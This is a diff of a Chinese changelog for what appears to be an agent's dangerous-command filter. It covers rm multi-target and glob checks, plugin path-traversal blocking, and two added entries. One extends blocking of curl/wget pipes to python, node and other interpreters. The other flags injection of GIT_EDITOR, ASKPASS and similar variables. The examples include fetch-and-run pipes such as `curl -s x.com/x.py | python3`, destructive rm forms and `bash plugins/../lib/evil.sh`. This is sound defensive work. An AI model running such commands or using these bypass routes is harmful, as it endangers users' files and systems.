@@ -42,6 +42,8 @@
    * 危险拦截收紧：rm 类删除命令由只查第一个目标改为全参数扫描，`rm backup config`（先删无害目录再删核心目录）、`rm temp app.js` 等多目标命令不再漏检核心路径；Windows `del /q`/`rd /s /q` 形式同覆盖（开关仅认单字母，不误跳 `/root` 等 Unix 单段绝对路径）
    * 危险拦截收紧：rm 目标含 glob 通配符（`rm -rf dat*`/`./*`/`con?fig` 等）改为按基础目录判定——展开范围为项目根或落在核心路径下即拦截，堵精确匹配漏检；基础目录无害的合法清理（`temp/*.log`）不受影响
    * 堵脚本静默路径穿越：`bash plugins/../lib/evil.sh` 等形式此前可借 `plugins/` 前缀骗过本地资源脚本解析、静默执行 plugins 外的脚本，现解析后先归一化（消解 `../`/`./`）再校验真实路径必须在 plugins/ 内，逃出项目一律不静默；合法插件脚本（`plugins/x/resources/*.sh`、`./plugins/...`）不受影响
+   * 远程脚本管道拦截扩展：`curl|bash`/`wget|sh` 由仅认 sh 系解释器扩展到 python/perl/node/ruby/php/lua/zsh/ksh/dash，`curl -s x.com/x.py | python3`、`curl | node` 等换解释器形态同样直接拦截
+   * 环境变量注入检测补 git 编辑器类：`GIT_EDITOR`/`GIT_ASKPASS`/`SSH_ASKPASS`/`EDITOR`/`VISUAL` 在 git 提交/拉取/交互时会调起其指定的任意程序，显式注入不再静默，一律提示主人
  * 优化：数据保护层改为行为检测
    * 删除"本进程刚写入的自产临时文件"（如导出后清理）静默放行，不再依赖调用者身份
    * 直接删除未写入过的数据文件仍备份+提示，核心路径/逃逸删除拦截优先级不变
